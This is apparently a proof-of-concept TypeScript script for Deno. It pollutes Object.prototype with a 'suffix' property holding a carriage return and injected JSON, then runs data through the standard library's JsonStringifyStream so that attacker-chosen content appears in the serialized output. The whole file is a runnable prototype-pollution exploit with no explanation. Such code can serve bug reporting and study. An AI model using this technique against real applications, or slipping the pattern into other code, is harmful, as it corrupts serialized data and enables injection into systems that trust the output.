import { JsonStringifyStream } from "https://deno.land/std@0.216.0/json/json_stringify_stream.ts";

function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

pollute("suffix", '\r{"hello":"world!"}');

const stream = ReadableStream.from([{ foo: "bar" }]);
for await (const data of stream.pipeThrough(new JsonStringifyStream())) {
    console.log(data);
}
